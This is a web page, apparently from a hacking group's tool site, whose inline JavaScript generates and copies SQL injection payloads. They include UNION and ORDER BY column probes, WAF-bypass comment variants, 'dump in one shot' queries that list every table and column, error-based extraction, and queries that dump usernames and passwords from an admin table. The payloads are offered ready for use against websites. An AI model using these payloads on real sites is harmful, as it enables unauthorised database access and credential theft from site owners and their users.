
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
     <meta name="description" content="Webt00ls Hacking And Programming">
     <meta name="keywords" content="Hacking Tools, TegalSec, Tegal1337">
     <meta name="author" content="Tegal1337">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <link rel="shortcute icon" href="log0.png">
  <title>
    Webt00ls | Tegal1337
  </title>
  <!--     Fonts and icons     -->
  <link href="https://fonts.googleapis.com/css?family=Poppins:200,300,400,600,700,800" rel="stylesheet" />
  <link href="https://use.fontawesome.com/releases/v5.0.6/css/all.css" rel="stylesheet">
  <!-- Nucleo Icons -->
  <link href="../assets/css/nucleo-icons.css" rel="stylesheet" />
  <!-- CSS Files -->
  <link href="../assets/css/black-dashboard.css?v=1.0.0" rel="stylesheet" />
  <!-- CSS Just for demo purpose, don't include it in your project -->
  <link href="../assets/demo/demo.css" rel="stylesheet" />
  <script type="text/javascript" src="../assets/js/editor.js"></script>

<script>
    function copy() {
      document.getElementById("query").select();
      document.execCommand("copy");
      alert("Sukses");
    }
    function populate(s1,s2){
        var s1 = document.getElementById(s1);
        var s2 = document.getElementById(s2);
        s2.innerHTML = "";
      if(s1.value == "User"){
        var optionArray = ["|","User1|User1","User2|User2","User3|User3","User4|User4","User5|User5"];
  }else if(s1.value == "Version"){
        var optionArray = ["|","Version1|Version1","Version2|Version2","Version3|Version3","Version4|Version4","Version5|Version5"];
  }else if(s1.value == "Database"){
        var optionArray = ["|","Database1|Database1","Database2|Database2","Database3|Database3"];
  }else if(s1.value == "Dios"){
        var optionArray = ["|","Dios|Dios","Dios(Bypass)|Dios(Bypass)","Dump Data|Dump Data","Dump Data(Bypass)|Dump Data(Bypass)","BypassForm|Bypass Form","Postgre|Postgre","Errbased|Error Based"];
  }else if(s1.value == "system"){
        var optionArray = ["|","HOSTNAME|HOSTNAME","VERSION_COMPILE_MACHINE|VERSION_COMPILE_MACHINE","VERSION_COMPILE_OS|VERSION_COMPILE_OS","BASEDIR|BASEDIR","HV_OPENSSL|HV_OPENSSL","HV_SYMLINK|HV_SYMLINK","PORT|PORT","SOCKET|SOCKET"];
  }else if(s1.value == "CG"){
        var optionArray = ["|","Order By|Order By","Order By(Bypass)|Order By(Bypass)","Group By|Group By","Union|Union","Union(Bypass)|Union(Bypass)","GenerateC|Hitung Jumlah Kolom","GenerateT|Hitung Jumlah Tabel","GenerateD|Hitung Jumlah Database"]
  }

 for(var option in optionArray) {
          var pair = optionArray[option].split("|");
          var newOption = document.createElement("option");
          newOption.value = pair[0];
          newOption.innerHTML = pair[1];
          s2.options.add(newOption);
        }
      }

    function querystr(){
      var query = document.getElementById('slct2');
      if(query.value == "User1"){
        var u1 = "@@user()";
        document.getElementById('query').value = u1;
      }else if(query.value == "User2"){
        var u2 = "@@CURRENT_USER()";
        document.getElementById('query').value = u2;
      }else if(query.value == "User3"){
        var u3 = "SYSTEM_USER()";
        document.getElementById('query').value = u3;
    }else if(query.value == "User4"){
        var u4 = "SESSION_USER()";
        document.getElementById('query').value = u4;
    }else if(query.value == "User5"){
        var u5 = "SUBSTRING_INDEX(USER(),0x40,1)";
        document.getElementById('query').value = u5;


    }else if(query.value == "Version1"){
        var ver1 = "version()";
        document.getElementById('query').value = ver1;
    }else if(query.value == "Version2"){
        var ver2 = "@@version";
        document.getElementById('query').value = ver2;
    }else if(query.value == "Version3"){
        var ver3 = "@@GLOBAL.version";
        document.getElementById('query').value = ver3;
    }else if(query.value == "Version4"){
        var ver4 = "(select+variable_value+from+information_schema.session_variables+where+variable_name+like+0x56455253494f4e)";
        document.getElementById('query').value = ver4;
    }else if(query.value == "Version5"){
        var ver5 = "(Select+variable_value+from+information_schema.global_variables+where+variable_name=0x76657273696f6e)";
        document.getElementById('query').value = ver5;


    }else if(query.value == "Database1"){
        var db1 = "database()";
        document.getElementById('query').value = db1;
    }else if(query.value == "Database2"){
        var db2 = "schema()";
        document.getElementById('query').value = db2;
    }else if(query.value == "Database3"){
        var db3 = "(SELECT+CONCAT(DB)+FROM+INFORMATION_SCHEMA.PROCESSLIST)";
        document.getElementById('query').value = db3;


    }else if(query.value == "HOSTNAME"){
        var s1 = "@@HOSTNAME";
        document.getElementById('query').value = s1;
    }else if(query.value == "VERSION_COMPILE_MACHINE"){
        var s2 = "@@VERSION_COMPILE_MACHINE";
        document.getElementById('query').value = s2;
    }else if(query.value == "VERSION_COMPILE_OS"){
        var s3 = "@@VERSION_COMPILE_OS";
        document.getElementById('query').value = s3;
    }else if(query.value == "VERSION_COMPILE_MACHINE"){
        var s4 = "@@VERSION_COMPILE_MACHINE";
        document.getElementById('query').value = s4;
    }else if(query.value == "VERSION_COMPILE_MACHINE"){
        var s5 = "@@VERSION_COMPILE_MACHINE";
        document.getElementById('query').value = s5;
    }else if(query.value == "BASEDIR"){
        var s6 = "@@BASEDIR";
        document.getElementById('query').value = s6;
    }else if(query.value == "HV_OPENSSL"){
        var s7 = "@@HV_OPENSSL";
        document.getElementById('query').value = s7;
    }else if(query.value == "HV_SYMLINK"){
        var s8 = "@@HV_SYMLINK";
        document.getElementById('query').value = s8;
    }else if(query.value == "PORT"){
        var s9 = "@@PORT";
        document.getElementById('query').value = s9;
    }else if(query.value == "SOCKET"){
        var s10 = "@@SOCKET";
        document.getElementById('query').value = s10;


    }else if(query.value == "Dios"){
        var dios = "make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)";
        document.getElementById('query').value = dios;
    }else if(query.value == "Dios(Bypass)"){
        var dios403 = "/*!12345make_set*/(6,@:=0x0a,(select(1)/*!12345from*/(/*!12345information_schema.columns*/)where@:=make_set(511,@,0x3c6c693e,/*!12345table_name*/,/*!12345column_name*/)),@)";
        document.getElementById('query').value = dios403;
    }else if(query.value == "BypassForm"){
        var bForm = "+and@r4nd5:=concat(@:=0,(select+count(*)/*!50000from*/information_schema.columns+where+table_schema=database()+and@:=concat+(@,0x3c6c693e,table_name,0x203a3a20,column_name)),@)+/*!50000UNION*/+SELECT+";
        document.getElementById('query').value = bForm;
    }else if(query.value == "Postgre"){
        var postgre = "(select+string_agg(concat(table_name,'::',column_name),$$<li>$$)from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$))";
        document.getElementById('query').value = postgre;
    }else if(query.value == "Errorbased"){
        var errbsd = "(SELECT!x-~0.FROM(SELECT(concat_ws(0x3a3a,user(),@@version,database(),concat(@:=0,(Select+count(*)from+information_schema.tables+where+table_schema=database()and@:=concat(@,0x0b,table_name)),@)))x)a)";
        document.getElementById('query').value = errbsd;
    }else if(query.value == "Order By"){
        var columns = prompt( "Order By ?", "22" );
    columns = Math.min(1000, parseInt( columns ));
    var colArray = new Array();
    for ( var i = 0 ; i < columns ; i++ ) {
      colArray.push( i+1 );
    }
    var kolom = "+order+by+" + colArray.join( ',' ) + ('--+'); document.getElementById('query').value = kolom;
    }else if(query.value == "Order By(Bypass)"){
        var columns = prompt( "Order By ?", "22" );
    columns = Math.min(1000, parseInt( columns ));
    var colArray = new Array();
    for ( var i = 0 ; i < columns ; i++ ) {
      colArray.push( i+1 );
    }
    var kolom = "+/*!50000order*/+/*!50000by*/+" + colArray.join( ',' ) + ('--+-'); document.getElementById('query').value = kolom;
    }else if(query.value == "Group By"){
        var columns = prompt( "Group By ?", "22" );
    columns = Math.min(1000, parseInt( columns ));
    var colArray = new Array();
    for ( var i = 0 ; i < columns ; i++ ) {
      colArray.push( i+1 );
    }
    var kolom = "+GROUP+BY+" + colArray.join( ',' ) + ('--+'); document.getElementById('query').value = kolom;
    }else if(query.value == "Union"){
        var columns = prompt( "Union Select ?", "22" );
    columns = Math.min(1000, parseInt( columns ));
    var colArray = new Array();
    for ( var i = 0 ; i < columns ; i++ ) {
      colArray.push( i+1 );
    }
    var kolom = "+union+select+" + colArray.join( ',' ) + ('--+'); document.getElementById('query').value = kolom;
    }else if(query.value == "Union(Bypass)"){
        var columns = prompt( "Union Select ?", "22" );
    columns = Math.min(1000, parseInt( columns ));
    var colArray = new Array();
    for ( var i = 0 ; i < columns ; i++ ) {
      colArray.push( i+1 );
    }
    var kolom = "+/*!50000union*/+/*!50000select*/+" + colArray.join( ',' ) + ('--+-'); document.getElementById('query').value = kolom;
    }else if(query.value == "GenerateD"){
var dbc = "concat(0x546f74616c20446174616261736573203e3e20,(select+count(*)from+information_schema.schemata))";
document.getElementById('query').value = dbc;
    }else if(query.value == "GenerateT"){
var tottbl = "concat(0x546f74616c205461626c6573203e3e20,(select+count(*)from+information_schema.tables+where+table_Schema=database()))";
document.getElementById('query').value = tottbl;
    }else if(query.value == "GenerateC"){
var totcol = "concat(0x546f74616c20436f6c756d6e73203e3e20,(select+count(*)from+information_schema.columns+where+table_Schema=database()))";
document.getElementById('query').value = totcol;
    }else if(query.value == "Dump Data"){
      var columns = prompt( "Nama table ?", "admin" );
      var columms = alert("Nama kolom isi sendiri ea");
      var koloms =  columns;
      var datas = "make_set(6,@:=0x0a,(select(1)from(" + koloms + (")where@:=make_set(511,@,0x3c6c693e,USER_NAME,PASSWORD)),@)");
      document.getElementById('query').value = datas;
    }else if(query.value == "Dump Data(Bypass)"){
      var columns = prompt( "Nama table ?", "admin" );
      var columms = alert("Nama kolom isi sendiri ea");
      var koloms =  columns;
      var datas = "/*!12345make_set*/(6,@:=0x0a,(select(1)/*!12345from*/(/*!12345" + koloms + ("*/)where@:=make_set(511,@,0x3c6c693e,/*!12345USER_NAME*/,/*!12345USER_PASS*/)),@)");
      document.getElementById('query').value = datas;
    }
 }
  </script>
</head>

<body class="">
  <div class="wrapper">
    <div class="sidebar">
      <!--
        Tip 1: You can change the color of the sidebar using: data-color="blue | green | orange | red"
    -->
      <div class="sidebar-wrapper">
        <div class="logo">
         <a href="javascript:void(0)" class="simple-text text-center logo-normal">
            Tegal1337
          </a>
        </div>
        <ul class="nav">
          <li>
            <a href="./index.php">
              <i class="tim-icons icon-vector"></i>
              <p>List of Tools</p>
            </a>
          </li>
          <li>
            <a href="./labs.php">
              <i class="tim-icons icon-laptop"></i>
              <p>Labs Pentesting</p>
            </a>
          </li>
          <li>
            <a href="./about.php">
              <i class="tim-icons icon-badge"></i>
              <p>About Us</p>
            </a>
          </li>
          <li>
            <a href="https://blog.tegalsec.org/">
              <i class="tim-icons icon-atom"></i>
              <p>Blog / Tutorial</p>
            </a>
          </li>
          <li>
            <a href="./join.php">
              <i class="tim-icons icon-single-02"></i>
              <p>Join with Us</p>
            </a>
          </li>
        </ul>
      </div>
    </div>
    <div class="main-panel">
      <!-- Navbar -->
      <nav class="navbar navbar-expand-lg navbar-absolute navbar-transparent">
        <div class="container-fluid">
          <div class="navbar-wrapper">
            <div class="navbar-toggle d-inline">
              <button type="button" class="navbar-toggler">
                <span class="navbar-toggler-bar bar1"></span>
                <span class="navbar-toggler-bar bar2"></span>
                <span class="navbar-toggler-bar bar3"></span>
              </button>
            </div>
            <a class="navbar-brand" href="javascript:void(0)">Webt00ls</a>
          </div>
          <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navigation" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-bar navbar-kebab"></span>
            <span class="navbar-toggler-bar navbar-kebab"></span>
            <span class="navbar-toggler-bar navbar-kebab"></span>
          </button>
          <div class="collapse navbar-collapse" id="navigation">
            <ul class="navbar-nav ml-auto">
              <li class="search-bar input-group">
                <button class="btn btn-link" id="search-button" data-toggle="modal" data-target="#searchModal"><i class="tim-icons icon-zoom-split" ></i>
                  <span class="d-lg-none d-md-block">Search</span>
                </button>
              </li>
              <li class="dropdown nav-item">
                <a href="javascript:void(0)" class="dropdown-toggle nav-link" data-toggle="dropdown">
                  <div class="notification d-none d-lg-block d-xl-block"></div>
                  <i class="tim-icons icon-sound-wave"></i>
                  <p class="d-lg-none">
                    Changelog
                  </p>
                </a>
                <ul class="dropdown-menu dropdown-menu-right dropdown-navbar">
                  <li class="nav-link"><a href="#" class="nav-item dropdown-item"></a></li>
                  <li class="nav-link"><a href="javascript:void(0)" class="nav-item dropdown-item">update fix bug jso.php</a></li>
                  <li class="nav-link"><a href="javascript:void(0)" class="nav-item dropdown-item">Update disclaimer for publishing</a></li>
                  <li class="nav-link"><a href="javascript:void(0)" class="nav-item dropdown-item">Another update</a></li>
                </ul>
              </li>
              <li class="separator d-lg-none"></li>
            </ul>
          </div>
        </div>
      </nav>
      <div class="modal modal-search fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="searchModal" aria-hidden="true">
        <div class="modal-dialog" role="document">
          <div class="modal-content">
            <div class="modal-header">
              <input type="text" class="form-control" id="inlineFormInputGroup" placeholder="SEARCH">
              <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                <i class="tim-icons icon-simple-remove"></i>
              </button>
            </div>
          </div>
        </div>
      </div>
      <!-- End Navbar -->
      <div class="content">
      	<h2 class="text-center">Query Injection</h2>
        <div class="row">
          <div class="col-md-12">
            <div class="card card">
              <div class="card-body">
                  <div class="row">
        <div class="col">
          <select class="custom-select" id="slct1" name="slct1" onchange="populate(this.id,'slct2')">
        <option selected="selected">Select Query</option>
        <option value="User">User</option>
        <option value="Version">Version</option>
        <option value="Database">Database</option>
        <option value="Dios">Dump In Shot</option>
        <option value="system">System Variable</option>
        <option value="CG">Count & Generate</option>
      </select>
        </div>
      </div>
        <div class="col">
          <select name="slct2" id="slct2" class="custom-select">
            <option selected="selected">Query</option>
          </select>
        </div>
         <div class="col-md-12">
          <button type="submit" name="submit" class="btn btn-block mt-3" onclick="querystr()">Use Query</button>
        </div>
      </div>
    </div>
  </div>

  <div class="col-md-12 text-center">
    <div class="tile">
      <textarea id="query" class="form-control bg-transparent" rows="6" placeholder="Hasil Query" readonly="readonly"></textarea>
    </div>
  </div>
  <div class="col-md-12">
          <button type="submit" name="submit" class="btn btn-block mt-3" onclick="copy()">Copy Query</button>
        </div>
</div>


              </div>
            </div>
          </div>
        </div>
      </div>
      <footer class="footer">
        <div class="container-fluid">
          <ul class="nav">
            <li class="nav-item">
              <a href="javascript:void(0)" class="nav-link">
                TEGAL1337
              </a>
            </li>
            <li class="nav-item">
              <a href="javascript:void(0)" class="nav-link">
                DISCLAIMER
              </a>
            </li>
            <li class="nav-item">
              <a href="javascript:void(0)" class="nav-link">
                PRIVACY POLICY
              </a>
            </li>
          </ul>
          <div class="copyright">
            ©
            <script>
              document.write(new Date().getFullYear())
            </script> made with <i class="tim-icons icon-heart-2"></i> by
            <a href="javascript:void(0)" target="_blank">TEGAl1337</a>
          </div>
        </div>
      </footer>
    </div>
  </div>
     <div class="fixed-plugin">
    <div class="dropdown show-dropdown">
      <a href="#" data-toggle="dropdown">
        <i class="fa fa-cog fa-2x"> </i>
      </a>
      <ul class="dropdown-menu">
        <li class="header-title"> Sidebar Background</li>
        <li class="adjustments-line">
          <a href="javascript:void(0)" class="switch-trigger background-color">
            <div class="badge-colors text-center">
              <span class="badge filter badge-primary active" data-color="primary"></span>
              <span class="badge filter badge-info" data-color="blue"></span>
              <span class="badge filter badge-success" data-color="green"></span>
            </div>
            <div class="clearfix"></div>
          </a>
        </li>
        <li class="adjustments-line text-center color-change">
          <span class="color-label">LIGHT MODE</span>
          <span class="badge light-badge mr-2"></span>
          <span class="badge dark-badge ml-2"></span>
          <span class="color-label">DARK MODE</span>
        </li>
        <li class="button-container">
          <a href="https://fb.com/tegal1337" target="_blank" class="btn btn-default btn-block btn-round">Request Tools</a>
          <a href="mailto:tegaln00bshacker@gmail.com" target="_blank" class="btn btn-info btn-block btn-round">
            Lapor Bug
          </a>
        </li>
        <li class="header-title">Thank you for 95 shares!</li>
        <li class="button-container text-center">
          <button id="twitter" class="btn btn-round btn-info"><i class="fab fa-twitter"></i> &middot; 45</button>
          <button id="facebook" class="btn btn-round btn-info"><i class="fab fa-facebook-f"></i> &middot; 50</button>
          <br>
          <br>
        </li>
      </ul>
    </div>
  </div>
  <!--   Core JS Files   -->
  <script src="../assets/js/core/jquery.min.js"></script>
  <script src="../assets/js/core/popper.min.js"></script>
  <script src="../assets/js/core/bootstrap.min.js"></script>
  <script src="../assets/js/plugins/perfect-scrollbar.jquery.min.js"></script>
  <!--  Google Maps Plugin    -->
  <!-- Place this tag in your head or just before your close body tag. -->
  <script src="https://maps.googleapis.com/maps/api/js?key=YOUR_KEY_HERE"></script>
  <!-- Chart JS -->
  <script src="../assets/js/plugins/chartjs.min.js"></script>
  <!--  Notifications Plugin    -->
  <script src="../assets/js/plugins/bootstrap-notify.js"></script>
  <!-- Control Center for Black Dashboard: parallax effects, scripts for the example pages etc -->
  <script src="../assets/js/black-dashboard.min.js?v=1.0.0"></script><!-- Black Dashboard DEMO methods, don't include it in your project! -->
  <script src="../assets/demo/demo.js"></script>
  <script>
    $(document).ready(function() {
      $().ready(function() {
        $sidebar = $('.sidebar');
        $navbar = $('.navbar');
        $main_panel = $('.main-panel');

        $full_page = $('.full-page');

        $sidebar_responsive = $('body > .navbar-collapse');
        sidebar_mini_active = true;
        white_color = false;

        window_width = $(window).width();

        fixed_plugin_open = $('.sidebar .sidebar-wrapper .nav li.active a p').html();



        $('.fixed-plugin a').click(function(event) {
          if ($(this).hasClass('switch-trigger')) {
            if (event.stopPropagation) {
              event.stopPropagation();
            } else if (window.event) {
              window.event.cancelBubble = true;
            }
          }
        });

        $('.fixed-plugin .background-color span').click(function() {
          $(this).siblings().removeClass('active');
          $(this).addClass('active');

          var new_color = $(this).data('color');

          if ($sidebar.length != 0) {
            $sidebar.attr('data', new_color);
          }

          if ($main_panel.length != 0) {
            $main_panel.attr('data', new_color);
          }

          if ($full_page.length != 0) {
            $full_page.attr('filter-color', new_color);
          }

          if ($sidebar_responsive.length != 0) {
            $sidebar_responsive.attr('data', new_color);
          }
        });

        $('.switch-sidebar-mini input').on("switchChange.bootstrapSwitch", function() {
          var $btn = $(this);

          if (sidebar_mini_active == true) {
            $('body').removeClass('sidebar-mini');
            sidebar_mini_active = false;
            blackDashboard.showSidebarMessage('Sidebar mini deactivated...');
          } else {
            $('body').addClass('sidebar-mini');
            sidebar_mini_active = true;
            blackDashboard.showSidebarMessage('Sidebar mini activated...');
          }

          // we simulate the window Resize so the charts will get updated in realtime.
          var simulateWindowResize = setInterval(function() {
            window.dispatchEvent(new Event('resize'));
          }, 180);

          // we stop the simulation of Window Resize after the animations are completed
          setTimeout(function() {
            clearInterval(simulateWindowResize);
          }, 1000);
        });

        $('.switch-change-color input').on("switchChange.bootstrapSwitch", function() {
          var $btn = $(this);

          if (white_color == true) {

            $('body').addClass('change-background');
            setTimeout(function() {
              $('body').removeClass('change-background');
              $('body').removeClass('white-content');
            }, 900);
            white_color = false;
          } else {

            $('body').addClass('change-background');
            setTimeout(function() {
              $('body').removeClass('change-background');
              $('body').addClass('white-content');
            }, 900);

            white_color = true;
          }


        });

        $('.light-badge').click(function() {
          $('body').addClass('white-content');
        });

        $('.dark-badge').click(function() {
          $('body').removeClass('white-content');
        });
      });
    });
  </script>
  <script>
    $(document).ready(function() {
      // Javascript method's body can be found in assets/js/demos.js
      demo.initGoogleMaps();
    });
  </script>
  <script src="https://cdn.trackjs.com/agent/v3/latest/t.js"></script>
  <script>
    window.TrackJS &&
      TrackJS.install({
        token: "ee6fab19c5a04ac1a32a645abde4613a",
        application: "black-dashboard-free"
      });
  </script>
</body>

</html>
